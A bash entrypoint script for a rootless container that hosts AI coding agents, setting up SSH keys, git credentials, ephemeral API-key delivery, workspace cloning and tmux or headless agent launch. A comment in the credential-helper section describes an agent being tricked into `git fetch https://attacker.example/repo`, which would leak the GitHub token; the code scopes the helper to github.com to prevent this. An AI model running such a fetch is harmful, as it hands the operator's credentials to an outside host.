#!/usr/bin/env bash
# entrypoint.sh — container PID 1 for the agent-container image.
#
# Responsibilities (in order):
#   1. Validate required env vars (fail fast, never log their values).
#   2. Install/persist/generate the SSH host key + assemble authorized_keys
#      (from bind-mount, env, or the persisted ~/.ssh volume) as the dev user.
#   3. Configure git identity + HTTPS credential helper for the dev user.
#   4. Start sshd in the background.
#   5. Start a detached tmux session named 'main' for the dev user.
#   6. Stay alive as PID 1, forwarding SIGTERM/SIGINT to a clean shutdown.
#
# Runs as the non-root 'dev' user with NO root/sudo (fully rootless container):
# sshd runs as dev on an unprivileged port and the SSH host key lives in the
# dev-owned ~/.ssh volume. NEVER echoes env-var contents to logs.
#
# Override: if invoked with arguments, exec them instead of the default flow
# (e.g. `docker run image bash` for debugging).

set -euo pipefail

log() {
    # Stderr so it interleaves predictably with sshd's stderr logging.
    printf '[entrypoint] %s\n' "$*" >&2
}

die() {
    log "FATAL: $*"
    exit 1
}

# --- Debug override ---------------------------------------------------------
# If the operator passed a command (e.g. `bash`), run it instead of the default
# sshd+tmux flow. This lets the image be used interactively for debugging.
if [[ $# -gt 0 ]]; then
    exec "$@"
fi

# --- 1. Validate env vars ---------------------------------------------------
# Required: must be set AND non-empty. We check presence by name only; we never
# print or trace the values. `set -u` plus :- pattern keeps `set -e` from
# tripping on unset vars during the check itself.
require_env() {
    local name=$1
    if [[ -z "${!name:-}" ]]; then
        die "required env var ${name} is missing or empty"
    fi
}

require_env GH_TOKEN
require_env GIT_USER_NAME
require_env GIT_USER_EMAIL

# Optional: agents can authenticate either via these keys OR via interactive
# login inside the container ('claude login' / 'codex login'), whose OAuth
# credential persists on the per-container volume and auto-refreshes. So an
# absent key is only a NOTE, not a hard failure.
for opt in ANTHROPIC_API_KEY OPENAI_API_KEY; do
    if [[ -z "${!opt:-}" ]]; then
        log "NOTE: optional env var ${opt} is not set. Either set it in .env, or run the agent's interactive login inside the container (e.g. 'claude login' / 'codex login'); that credential persists on this container's volume across restarts."
    fi
done

# --- 1b. Seed persistent shell-env template ---------------------------------
# /home/dev/.agent-env lives on the per-container 'shellenv' named volume and is
# (Feature 011) named for what it IS — the persistent shell environment — rather
# than sharing a name with the project config directory it has nothing to do with.
# sourced into every interactive bash/zsh shell (see Dockerfile). On first boot
# the volume is empty, so drop a commented template explaining its purpose.
# Idempotent: never overwrite an existing file, and never echo its contents.
# Home base is /home/dev in the image (deliberately hardcoded, not $HOME, since
# the runtime may not export HOME for the non-root user). AGENT_CONTAINER_HOME lets the
# off-container test harness redirect this one path; production leaves it unset
# so the default is byte-identical to the previous behavior.
AGENT_CONTAINER_HOME="${AGENT_CONTAINER_HOME:-/home/dev}"
AGENT_CONTAINER_ENV_FILE="${AGENT_CONTAINER_HOME}/.agent-env/env"
if [[ ! -f "${AGENT_CONTAINER_ENV_FILE}" ]]; then
    log "seeding persistent shell-env template at ${AGENT_CONTAINER_ENV_FILE}"
    mkdir -p "${AGENT_CONTAINER_HOME}/.agent-env"
    cat > "${AGENT_CONTAINER_ENV_FILE}" <<'EOF'
# ~/.agent-env/env — persistent shell environment for this agent-container container.
#
# This file lives on the per-container 'shellenv' named volume, so it survives
# `agent-container down` / `agent-container up` and crashes (it is dropped only by `down --purge`).
# It is sourced with `set -a` into every interactive bash and zsh shell,
# including tmux panes. Keep it to simple KEY=VALUE / export lines.
#
# Example:
#   export FOO=bar
EOF
else
    log "persistent shell-env file already present, leaving it alone"
fi

# --- 2. SSH host key (rootless: dev-owned, on the persisted ~/.ssh volume) ---
# The host key lives in ~/.ssh/hostkeys (a per-container named volume), so a
# container keeps a STABLE identity across down/up while different containers
# differ. Generated as the dev user — no root. ssh-keygen -A cannot target a
# custom dir, so we generate the single ed25519 key explicitly. Idempotent:
# only generate if absent (a persisted or injected key is left untouched).
SSH_DIR="${AGENT_CONTAINER_HOME}/.ssh"
HOSTKEY_DIR="${SSH_DIR}/hostkeys"
HOSTKEY="${HOSTKEY_DIR}/ssh_host_ed25519_key"
mkdir -p "${HOSTKEY_DIR}"
chmod 0700 "${SSH_DIR}" "${HOSTKEY_DIR}"

# Host-key source precedence (highest first). A container adopts an operator-
# supplied identity if given, else keeps its persisted one, else generates:
#   1. bind-mounted file at /run/agent-container/ssh_host_ed25519_key (`up --host-key`)
#   2. SSH_HOST_ED25519_KEY_B64 env var (base64 of the private key; env-file channel)
#   3. already-persisted key on the ~/.ssh volume
#   4. freshly generated ed25519 key
# INJECT_DIR is where `up --host-key/--authorized-key` bind-mounts the key
# files. AGENT_CONTAINER_INJECT_DIR lets the off-container test harness redirect
# it; production leaves it unset so the default is the real bind-mount path.
INJECT_DIR="${AGENT_CONTAINER_INJECT_DIR:-/run/agent-container}"
if [[ -f "${INJECT_DIR}/ssh_host_ed25519_key" ]]; then
    log "installing bind-mounted SSH host key"
    install -m 0600 "${INJECT_DIR}/ssh_host_ed25519_key" "${HOSTKEY}"
elif [[ -n "${SSH_HOST_ED25519_KEY_B64:-}" ]]; then
    log "installing SSH host key from SSH_HOST_ED25519_KEY_B64"
    printf '%s' "${SSH_HOST_ED25519_KEY_B64}" | base64 -d > "${HOSTKEY}"
    chmod 0600 "${HOSTKEY}"
elif [[ ! -f "${HOSTKEY}" ]]; then
    log "generating SSH host key (ed25519) at ${HOSTKEY}"
    ssh-keygen -q -t ed25519 -f "${HOSTKEY}" -N ''
else
    log "SSH host key already present, skipping generation"
fi
# Validate the key and (re)derive its public half. A bad injected key fails fast
# here rather than as an opaque sshd startup error.
if ! ssh-keygen -y -f "${HOSTKEY}" > "${HOSTKEY}.pub" 2>/dev/null; then
    die "SSH host key at ${HOSTKEY} is missing or invalid"
fi
chmod 0600 "${HOSTKEY}"
chmod 0644 "${HOSTKEY}.pub"

# --- 2b. authorized_keys: union of persisted + injected sources, deduped -----
# Non-secret (public keys). Sources: the persisted file, a bind-mounted file
# (`up --authorized-key`), and the SSH_AUTHORIZED_KEYS env var. Deduped so
# repeated boots and overlapping sources don't accumulate duplicates.
AUTHKEYS="${SSH_DIR}/authorized_keys"
_akt="$(mktemp)"
[[ -f "${AUTHKEYS}" ]] && cat "${AUTHKEYS}" >> "${_akt}"
[[ -f "${INJECT_DIR}/authorized_keys" ]] && cat "${INJECT_DIR}/authorized_keys" >> "${_akt}"
[[ -n "${SSH_AUTHORIZED_KEYS:-}" ]] && printf '%s\n' "${SSH_AUTHORIZED_KEYS}" >> "${_akt}"
if [[ -s "${_akt}" ]]; then
    awk 'NF && !seen[$0]++' "${_akt}" > "${AUTHKEYS}"
    chmod 0600 "${AUTHKEYS}"
    log "authorized_keys assembled ($(grep -c . "${AUTHKEYS}") key(s))"
fi
rm -f "${_akt}"

# sshd's privilege-separation directory (/run/sshd) is created root-owned at
# build time; a rootless sshd only needs it to exist, not to write to it.

# --- 3. Git identity + credential helper ------------------------------------
# Identity is non-secret; logging the name is fine. Email is also non-secret
# but we still don't echo it — keep the log surface minimal.
git config --global user.name "${GIT_USER_NAME}"
git config --global user.email "${GIT_USER_EMAIL}"
git config --global init.defaultBranch main
git config --global pull.rebase false

# Credential helper as a shell function. Single quotes are CRITICAL: the body
# is stored VERBATIM in ~/.gitconfig, so ${GH_TOKEN} is expanded by the helper
# shell at git-push time from the process env — not by this script now. The
# token is never written to disk in the container.
#
# SCOPED to https://github.com deliberately. A GLOBAL credential.helper would
# hand ${GH_TOKEN} to git for ANY https host it authenticates against — so an
# autonomous agent tricked into `git fetch https://attacker.example/repo` would
# leak the GitHub token to that host as Basic auth. The URL-scoped key only fires
# for github.com; no global helper is set, so other hosts get no credential at all.
git config --global credential.https://github.com.helper \
    '!f() { echo "username=x-access-token"; echo "password=${GH_TOKEN}"; }; f'

log "Configured git identity for ${GIT_USER_NAME}"

# --- 3a. Canonical agent config (Feature 003, US3) --------------------------
# Operator-canonical agent config is delivered FRESH each boot as ephemeral
# compose configs mirrored under ${INJECT_DIR}/config/<home-relative-path> (e.g.
# .claude/settings.json). Overlay that tree onto the agent home so the canonical
# files (settings.json, CLAUDE.md, config.toml, AGENTS.md, …) are OVERWRITTEN with
# the operator's current copy on every up/redeploy (FR-007), while every OTHER
# file under the home — the agent's mutable runtime state (history, caches, auth)
# — is left untouched and persists on the per-agent volume (FR-008). Idempotent:
# re-running just re-overlays the same files. Runs BEFORE the Claude apiKeyHelper
# patch (3c) so the helper merges into the freshly delivered settings.json rather
# than being clobbered by it, and BEFORE the codex/pi home seeding (3c) so those
# ephemeral homes pick up the fresh canonical config. Canonical config is non-secret
# by definition (FR-007); real secrets travel the ephemeral key-file channel (US2).
CONFIG_INJECT_DIR="${INJECT_DIR}/config"
if [[ -d "${CONFIG_INJECT_DIR}" ]]; then
    # `cp -R "<dir>/."` overlays the CONTENTS (including the dot-named agent homes)
    # onto HOME, creating subdirs as needed and overwriting only the delivered
    # canonical files. Plain -R (NOT -a/-p) so the unprivileged dev user never
    # fails trying to preserve the /run source ownership; the staged files are
    # 0644 (readable).
    if cp -RL "${CONFIG_INJECT_DIR}/." "${AGENT_CONTAINER_HOME}/" 2>/dev/null; then
        log "Delivered operator-canonical agent config fresh (runtime state under the home preserved)"
    else
        log "NOTE: failed to overlay canonical agent config from ${CONFIG_INJECT_DIR}"
    fi
fi

# --- 3b. Outbound SSH push key (Feature 003, US1) ---------------------------
# The agent PUSHES with a key DISTINCT from the inbound sshd host key. It is
# injected EPHEMERALLY (INJECT_DIR is a /run compose config) and MUST NOT be
# copied onto the persisted ~/.ssh volume (FR-012) — the operator's local copy is
# the sole durable copy. ssh refuses a group/world-readable private key and the
# injected file is 0644, so copy it to a 0600 file in an EPHEMERAL, container-
# private dir (under /tmp — vanishes with the container, never a named volume) and
# point git's ssh command at it. Layered alongside the HTTPS+GH_TOKEN helper
# above: the operator selects per remote (git@github.com vs https://github.com).
PUSH_RUNTIME="${AGENT_CONTAINER_PUSH_RUNTIME:-/tmp/agent-container-push.$(id -u)}"
_push_src=""
if [[ -f "${INJECT_DIR}/push_ed25519_key" ]]; then
    _push_src="${INJECT_DIR}/push_ed25519_key"
elif [[ -n "${SSH_PUSH_KEY_B64:-}" ]]; then
    mkdir -p "${PUSH_RUNTIME}" && chmod 700 "${PUSH_RUNTIME}"
    if printf '%s' "${SSH_PUSH_KEY_B64}" | base64 -d > "${PUSH_RUNTIME}/.b64" 2>/dev/null; then
        _push_src="${PUSH_RUNTIME}/.b64"
    fi
fi
if [[ -n "${_push_src}" ]]; then
    mkdir -p "${PUSH_RUNTIME}" && chmod 700 "${PUSH_RUNTIME}"
    install -m 0600 "${_push_src}" "${PUSH_RUNTIME}/push_key"
    rm -f "${PUSH_RUNTIME}/.b64"
    # A WRITABLE known_hosts (empty or pre-seeded from the injected file / env) so
    # accept-new never prompts: a pre-seeded entry means the remote is already
    # trusted; otherwise it is trusted-on-first-use and appended here.
    : > "${PUSH_RUNTIME}/known_hosts"
    if [[ -f "${INJECT_DIR}/known_hosts" ]]; then
        cat "${INJECT_DIR}/known_hosts" > "${PUSH_RUNTIME}/known_hosts"
    elif [[ -n "${PUSH_KNOWN_HOSTS:-}" ]]; then
        printf '%s\n' "${PUSH_KNOWN_HOSTS}" > "${PUSH_RUNTIME}/known_hosts"
    fi
    # core.sshCommand (in the ephemeral ~/.gitconfig) applies to every git push —
    # more robust than GIT_SSH_COMMAND, which would need env propagation into each
    # tmux/ssh session. IdentitiesOnly=yes so only this key is offered (no prompt).
    git config --global core.sshCommand \
        "ssh -i ${PUSH_RUNTIME}/push_key -o IdentitiesOnly=yes -o UserKnownHostsFile=${PUSH_RUNTIME}/known_hosts -o StrictHostKeyChecking=accept-new"
    log "Configured outbound git push over SSH (ephemeral key; IdentitiesOnly)"
fi

# --- 3c. Model/API credentials (Feature 003, US2) ---------------------------
# The TOOL-INJECTED model/API credential is ALWAYS ephemeral (H1, FR-012/SC-004):
# each provider key arrives as a compose config at ${INJECT_DIR}/apikeys/<provider>
# (a /run path that vanishes with the container) and is delivered to each agent
# WITHOUT ever landing on that agent's persistent volume — the deliberate opposite
# of an operator's own INTERACTIVE `login`, whose session persists on the volume and
# is the ONLY on-volume auth. Absent injected keys → the shipped env/.env +
# interactive-login paths still apply (a NOTE, never a die).
# AGENT_CONTAINER_APIKEY_RUNTIME lets the off-container test harness redirect the
# ephemeral home dirs; production leaves it unset so the default is a container-
# private /tmp path (vanishes with the container, never a named volume). Exports
# here reach the tmux server this entrypoint launches below — where the agents run.
APIKEY_INJECT_DIR="${INJECT_DIR}/apikeys"
APIKEY_RUNTIME="${AGENT_CONTAINER_APIKEY_RUNTIME:-/tmp/agent-container-apikeys.$(id -u)}"
_anthropic_key="${APIKEY_INJECT_DIR}/anthropic"
_openai_key="${APIKEY_INJECT_DIR}/openai"

# Claude Code — file-first via apiKeyHelper. The helper is a NON-secret command in
# ~/.claude/settings.json that CATS the ephemeral injected key at Claude's request
# time; the key bytes themselves NEVER touch the ~/.claude volume (H1). Self-healing:
# if the key is absent on a later boot the helper emits nothing and Claude falls back
# to ANTHROPIC_API_KEY / interactive login.
if [[ -f "${_anthropic_key}" ]]; then
    CLAUDE_DIR="${AGENT_CONTAINER_HOME}/.claude"
    mkdir -p "${CLAUDE_DIR}"
    _helper="${CLAUDE_DIR}/apikey-helper.sh"
    printf '#!/bin/sh\ncat "%s" 2>/dev/null || true\n' "${_anthropic_key}" > "${_helper}"
    chmod 0755 "${_helper}"
    _settings="${CLAUDE_DIR}/settings.json"
    if [[ -f "${_settings}" ]]; then
        # Merge (preserve the operator's other settings). The US3 canonical copy
        # (section 3a above) has already delivered any fresh settings.json, so this
        # patch merges the apiKeyHelper INTO the operator's current file.
        if command -v jq >/dev/null 2>&1; then
            _tmp="$(mktemp)"
            if jq --arg h "${_helper}" '.apiKeyHelper = $h' "${_settings}" > "${_tmp}" 2>/dev/null; then
                mv "${_tmp}" "${_settings}"
                log "Claude apiKeyHelper merged into ~/.claude/settings.json (ephemeral injected Anthropic key; never on the volume)"
            else
                rm -f "${_tmp}"
                log "NOTE: ~/.claude/settings.json is not valid JSON; leaving it unchanged (apiKeyHelper not wired — use ANTHROPIC_API_KEY or interactive login)"
            fi
        else
            log "NOTE: jq unavailable; cannot merge apiKeyHelper into the existing ~/.claude/settings.json"
        fi
    else
        printf '{\n  "apiKeyHelper": "%s"\n}\n' "${_helper}" > "${_settings}"
        chmod 0600 "${_settings}"
        log "Claude apiKeyHelper wired to the ephemeral injected Anthropic key (never written to the ~/.claude volume)"
    fi
fi

# Codex — redirect CODEX_HOME to an EPHEMERAL dir so an api-key login writes
# auth.json THERE, never onto the -codex volume (H1). Try the non-interactive
# api-key login reading the injected file on STDIN; if that codex build lacks it,
# fall back to OPENAI_API_KEY in the in-container env (003 FR-006 fallback — never on
# argv, never on a volume). CODEX_HOME is only redirected when a key is injected, so
# without one an operator's interactive `codex login` still persists on the volume.
if [[ -f "${_openai_key}" ]]; then
    export CODEX_HOME="${APIKEY_RUNTIME}/codex-home"
    mkdir -p "${CODEX_HOME}"
    chmod 0700 "${CODEX_HOME}"
    # Seed the ephemeral home from the on-volume ~/.codex — its canonical config
    # (config.toml/AGENTS.md, delivered FRESH by section 3a) and prior state — so
    # the redirect does not hide the operator's config (FR-007/SC-005). The
    # injected auth written below stays ONLY in this ephemeral dir (FR-012). (New
    # session state written here is ephemeral in injected-key mode; use interactive
    # stored-auth for persistent codex state.)
    if [[ -d "${AGENT_CONTAINER_HOME}/.codex" ]]; then
        cp -RL "${AGENT_CONTAINER_HOME}/.codex/." "${CODEX_HOME}/" 2>/dev/null || true
    fi
    _codex_ok=0
    if command -v codex >/dev/null 2>&1; then
        if timeout 30 codex login --with-api-key < "${_openai_key}" >/dev/null 2>&1; then
            _codex_ok=1
        fi
    fi
    if [[ "${_codex_ok}" -eq 1 ]]; then
        log "Codex authenticated from the ephemeral injected OpenAI key (CODEX_HOME redirected off the -codex volume)"
    else
        OPENAI_API_KEY="$(cat "${_openai_key}")"
        export OPENAI_API_KEY
        log "Codex: exported OPENAI_API_KEY into the in-container env (ephemeral CODEX_HOME; the -codex volume is never written)"
    fi
fi

# pi-coding-agent — if ANY provider key is injected, redirect PI_CODING_AGENT_DIR
# to an EPHEMERAL dir so nothing pi writes lands on the -pi volume (H1). pi has no
# documented non-interactive file login, so its injected-key delivery is the
# in-container env (exported just below); the -pi volume is never written. Only
# redirected when a key is injected, so interactive `pi login` otherwise persists.
_any_apikey=0
if [[ -d "${APIKEY_INJECT_DIR}" ]]; then
    for _k in "${APIKEY_INJECT_DIR}"/*; do
        [[ -f "${_k}" ]] && { _any_apikey=1; break; }
    done
fi
if [[ "${_any_apikey}" -eq 1 ]]; then
    export PI_CODING_AGENT_DIR="${APIKEY_RUNTIME}/pi-home"
    mkdir -p "${PI_CODING_AGENT_DIR}"
    chmod 0700 "${PI_CODING_AGENT_DIR}"
    # Seed from the on-volume ~/.pi so the redirect keeps the operator's canonical
    # config visible (FR-007/SC-005); anything pi writes here stays ephemeral (FR-012).
    if [[ -d "${AGENT_CONTAINER_HOME}/.pi" ]]; then
        cp -RL "${AGENT_CONTAINER_HOME}/.pi/." "${PI_CODING_AGENT_DIR}/" 2>/dev/null || true
    fi
    log "pi: PI_CODING_AGENT_DIR redirected to an ephemeral dir (the -pi volume is never written)"
fi

# In-container env delivery (003 FR-006 fallback) for agents without a non-interactive
# file-auth path (pi; codex if its api-key login was unavailable; opencode always).
# Read from the ephemeral injected file into the env — never argv, never a volume,
# never baked.
#
# Feature 010 / research R6: opencode needs NO ephemeral-$HOME redirect. codex and
# pi are redirected purely to keep an injected key out of their on-volume auth
# store; opencode reads ANTHROPIC_API_KEY / OPENAI_API_KEY straight from the env
# and — VERIFIED by running it — never writes an env-supplied key to
# ~/.local/share/opencode/auth.json. So env delivery alone is STRICTLY LESS
# exposure here, not more. Do not add a redirect for symmetry. The on-volume
# auth.json stays operator-interactive-login only, as for the other three.
# Do NOT clobber a value the operator already set via .env (that layer wins).
if [[ -f "${_anthropic_key}" && -z "${ANTHROPIC_API_KEY:-}" ]]; then
    ANTHROPIC_API_KEY="$(cat "${_anthropic_key}")"
    export ANTHROPIC_API_KEY
fi
if [[ -f "${_openai_key}" && -z "${OPENAI_API_KEY:-}" ]]; then
    OPENAI_API_KEY="$(cat "${_openai_key}")"
    export OPENAI_API_KEY
fi

# --- 3d. Clone-on-start (Feature 004, US4) ----------------------------------
# Populate /workspace from a source repo on first start (persistent/ephemeral).
# The credential is chosen by URL SCHEME (both wired above): https:// uses the
# github.com GH_TOKEN helper (section 3); git@…/ssh:// uses the ephemeral push key
# via core.sshCommand (section 3b) — and an SSH URL with NO push key configured
# fails fast (FR-014), never starting an empty-workspace agent. Idempotent: skip
# when /workspace already holds a working copy (a persistent recreate never
# re-clones over local state). A bind workspace is never given a clone URL by the
# CLI. Runs BEFORE the agent launch (interactive window / headless workload).
WORKSPACE_DIR="${AGENT_CONTAINER_WORKSPACE:-/workspace}"
CLONE_URL="${AGENT_CONTAINER_CLONE_URL:-}"
if [[ -n "${CLONE_URL}" ]]; then
    if [[ -d "${WORKSPACE_DIR}/.git" ]]; then
        log "clone-on-start: ${WORKSPACE_DIR} already holds a working copy, skipping clone"
    elif [[ -n "$(ls -A "${WORKSPACE_DIR}" 2>/dev/null)" ]]; then
        log "clone-on-start: ${WORKSPACE_DIR} is non-empty (no .git) — skipping clone"
    else
        case "${CLONE_URL}" in
            https://github.com/*)
                # The git credential helper (section 3) is scoped to https://github.com,
                # so GH_TOKEN authenticates ONLY github.com HTTPS clones.
                log "clone-on-start: cloning via HTTPS (github.com → GH_TOKEN)"
                git clone "${CLONE_URL}" "${WORKSPACE_DIR}" || die "clone-on-start failed for ${CLONE_URL}"
                ;;
            https://*)
                # A non-github.com HTTPS remote: GH_TOKEN does NOT apply (the helper is
                # github.com-scoped for least exposure). Works only if the repo is public
                # or git already has ambient credentials for that host.
                log "clone-on-start: cloning via HTTPS (non-github.com host — GH_TOKEN does NOT apply; repo must be public or have its own git credentials)"
                git clone "${CLONE_URL}" "${WORKSPACE_DIR}" || die "clone-on-start failed for ${CLONE_URL}"
                ;;
            *)  # ssh:// or scp-like git@host:path — needs the injected push key
                if ! git config --global --get core.sshCommand >/dev/null 2>&1; then
                    die "clone-on-start: ${CLONE_URL} is an SSH URL but no push key was injected (FR-014); refusing to start an empty-workspace agent"
                fi
                log "clone-on-start: cloning via SSH (injected push key)"
                git clone "${CLONE_URL}" "${WORKSPACE_DIR}" || die "clone-on-start failed for ${CLONE_URL}"
                ;;
        esac
    fi
fi

# --- Feature 004: execution mode + per-agent invocation ---------------------
# AGENT_CONTAINER_MODE (default interactive) selects the container's shape.
# AGENT_CONTAINER_AGENT (claude|codex|pi|opencode) names the primary agent; when UNSET the
# pre-004 bare-shell layout is preserved (no agent auto-launched). The optional
# initial/headless task arrives as an EPHEMERAL injected file (never argv/env).
AGENT_CONTAINER_MODE="${AGENT_CONTAINER_MODE:-interactive}"
AGENT_CONTAINER_AGENT="${AGENT_CONTAINER_AGENT:-}"
TASK_FILE="${INJECT_DIR}/task"

# Feature 010 FR-012: fail CLEARLY when the selected agent is not in this image
# (an image built before the agent was added). Without this the failure surfaces
# as `exec: <agent>: not found` / exit 127, which names no remedy. Checked for the
# SELECTED agent only — preflighting all four would make a partially-stale image
# refuse to start entirely, which is a worse outcome than the one being fixed.
require_agent_binary() {
    local a="$1"
    command -v "${a}" >/dev/null 2>&1 && return 0
    die "agent '${a}' is not installed in this image (built before it was added). Rebuild the image and recreate: agent-container redeploy <name>"
}

# Interactive launch command for the tmux window: the agent, seeded with the task.
# The task text is kept out of the host-side compose model and read from the
# injected file at runtime — it is then passed to the agent as its argument (so it
# appears in the agent's in-container process argv, the same as any prompt would).
# Returns an empty string for an unknown/blank agent so the caller can skip the launch.
build_interactive_cmd() {
    local a="$1"
    case "${a}" in
        claude) [[ -f "${TASK_FILE}" ]] && echo "claude \"\$(cat ${TASK_FILE})\"" || echo "claude" ;;
        codex)  [[ -f "${TASK_FILE}" ]] && echo "codex \"\$(cat ${TASK_FILE})\""  || echo "codex" ;;
        pi)     [[ -f "${TASK_FILE}" ]] && echo "pi \"\$(cat ${TASK_FILE})\""      || echo "pi" ;;
        # opencode's TUI positional is a PROJECT DIRECTORY, not a message
        # (`opencode [project]`), so the task must NOT be passed as an argument —
        # `opencode "fix the bug"` would be read as a path. The task is delivered
        # for headless runs only; interactive opencode starts unseeded and the
        # operator pastes the task. Verified against `opencode --help` (1.18.6).
        opencode) echo "opencode" ;;
        *) echo "" ;;
    esac
}

# Headless: exec the agent's non-interactive form as PID 1's workload so the
# CONTAINER exits with the agent's exit code (004 FR-002). The task (possibly empty)
# is read from the injected file. Uses `exec` — the agent replaces this entrypoint.
run_headless_agent() {
    local a="$1" t=""
    [[ -f "${TASK_FILE}" ]] && t="$(cat "${TASK_FILE}")"
    # Validate the NAME before probing for the binary. Reversed, an unknown agent
    # such as 'gpt' would report "not installed in this image — run redeploy",
    # sending the operator to rebuild an image that was never the problem.
    case "${a}" in
        claude|codex|pi|opencode) ;;
        *) die "headless mode: unknown agent '${a}' (choose claude|codex|pi|opencode)" ;;
    esac
    require_agent_binary "${a}"
    case "${a}" in
        claude) exec claude -p "${t}" ;;
        codex)  exec codex exec "${t}" ;;
        pi)     exec pi -p "${t}" ;;
        # `opencode run` is the documented non-interactive form. VERIFIED to
        # propagate a failing exit status (research R5), which FR-005 requires.
        opencode) exec opencode run "${t}" ;;
        *) die "headless mode: unknown agent '${a}' (choose claude|codex|pi|opencode)" ;;
    esac
}

if [[ "${AGENT_CONTAINER_MODE}" == "headless" ]]; then
    # A headless run needs neither sshd nor tmux — output is retrieved via
    # `compose logs` and the result is the container exit code (research R5).
    log "headless mode: running agent '${AGENT_CONTAINER_AGENT:-claude}' as the container workload"
    run_headless_agent "${AGENT_CONTAINER_AGENT:-claude}"
    # run_headless_agent execs; the lines below are unreachable in headless mode.
    die "headless agent failed to exec"
fi

# --- 4. sshd (interactive mode) ---------------------------------------------
# Daemonize (no -D) so the entrypoint can continue to start tmux and tail.
# Started as the dev user (rootless) — sshd listens on the unprivileged port
# 2222 with its host key + pidfile under the dev-owned ~/.ssh volume.
# sshd's own logs go to stderr / syslog per the image's sshd_config.
# AGENT_CONTAINER_SSHD lets the test harness substitute a stub; production
# leaves it unset so the default is the real sshd binary.
"${AGENT_CONTAINER_SSHD:-/usr/sbin/sshd}"
log "sshd listening"

# --- 5. tmux session --------------------------------------------------------
# Detached session named 'main'. On first creation, build a configurable set of
# windows from AGENT_CONTAINER_TMUX_WINDOWS (space-separated names). Default when unset:
# "shell edit agents". Opt-out: setting AGENT_CONTAINER_TMUX_WINDOWS to an EMPTY string
# creates just a single default window (today's behavior). Windows are BARE
# SHELLS — agents are NEVER auto-launched via send-keys. Idempotent: the layout
# is built only inside the has-session guard (when the session does not already
# exist), so a restart never duplicates windows. Each requested window name is
# validated against a safe charset before it reaches tmux; invalid names are
# skipped, never forwarded unsanitized. No env-var value is ever echoed.
if tmux has-session -t main 2>/dev/null; then
    log "tmux session 'main' already exists, leaving it alone"
else
    # '-' (not ':-') so an unset var falls back to the default layout while an
    # explicitly-empty value is honored as an opt-out.
    tmux_windows="${AGENT_CONTAINER_TMUX_WINDOWS-shell edit agents}"
    valid_windows=()
    for w in ${tmux_windows}; do
        if [[ "${w}" =~ ^[A-Za-z0-9._-]+$ ]]; then
            valid_windows+=("${w}")
        else
            log "skipping invalid tmux window name (must match [A-Za-z0-9._-]+)"
        fi
    done
    if [[ ${#valid_windows[@]} -eq 0 ]]; then
        # Opt-out (empty var) or every requested name rejected: single window.
        tmux new-session -d -s main
        log "tmux session 'main' ready (single default window)"
    else
        # First window carries the session and is named after the first entry.
        # Capture its window id so we can reselect it UNAMBIGUOUSLY below: an
        # all-numeric name (permitted by the charset) would otherwise be read by
        # `select-window -t main:NAME` as a window INDEX, landing on the wrong
        # window. The #{window_id} form (e.g. '@0') is never index-ambiguous.
        first_id="$(tmux new-session -d -P -F '#{window_id}' -s main -n "${valid_windows[0]}")"
        for (( wi = 1; wi < ${#valid_windows[@]}; wi++ )); do
            tmux new-window -t main -n "${valid_windows[wi]}"
        done
        # Select the first window so an attach lands there (by id, not name).
        tmux select-window -t "${first_id}"
        log "tmux session 'main' ready with ${#valid_windows[@]} window(s)"
    fi
fi

# --- 5b. Launch the primary agent (Feature 004, US1) ------------------------
# In interactive mode, run the chosen agent in a DEDICATED tmux window, seeded
# with the injected task if present. Only when an agent is configured
# (AGENT_CONTAINER_AGENT set) — otherwise the pre-004 bare-shell layout stands
# (backward compatible; no agent auto-launched). Idempotent: skip if the window
# already exists. A crash-restart rebuilds 'main' fresh (has-session was false),
# so the agent relaunches on a fresh session (FR-009).
if [[ -n "${AGENT_CONTAINER_AGENT}" ]]; then
    if tmux list-windows -t main -F '#{window_name}' 2>/dev/null | grep -qxF "${AGENT_CONTAINER_AGENT}"; then
        log "agent window '${AGENT_CONTAINER_AGENT}' already present, leaving it alone"
    else
        require_agent_binary "${AGENT_CONTAINER_AGENT}"
        if [[ "${AGENT_CONTAINER_AGENT}" == "opencode" && -f "${TASK_FILE}" ]]; then
            log "NOTE: opencode's interactive TUI takes a project directory, not a message, so the injected task is NOT seeded into the session; paste it in, or use --mode headless where the task IS delivered."
        fi
        launch_cmd="$(build_interactive_cmd "${AGENT_CONTAINER_AGENT}")"
        if [[ -n "${launch_cmd}" ]]; then
            tmux new-window -t main -n "${AGENT_CONTAINER_AGENT}" "${launch_cmd}"
            # Land an attach on the agent window (by name; the names
            # claude/codex/pi/opencode are never index-ambiguous).
            tmux select-window -t "main:${AGENT_CONTAINER_AGENT}"
            log "launched agent '${AGENT_CONTAINER_AGENT}' in a tmux window (attach lands here)"
        fi
    fi
fi

# --- 6. PID 1 lifecycle + signal handling -----------------------------------
# Trap SIGTERM/SIGINT for a clean shutdown: stop the tmux server, stop sshd,
# then exit 0. `tail -f /dev/null &` + `wait` is the canonical pattern that
# lets bash's trap fire promptly (a foreground `exec tail` would not).

shutdown() {
    log "shutdown signal received, stopping tmux and sshd"
    tmux kill-server 2>/dev/null || true
    # sshd runs as dev (rootless); dev can signal its own process — no sudo.
    pkill -TERM -x sshd 2>/dev/null || true
    exit 0
}

trap shutdown TERM INT

tail -f /dev/null &
TAIL_PID=$!
wait "${TAIL_PID}"
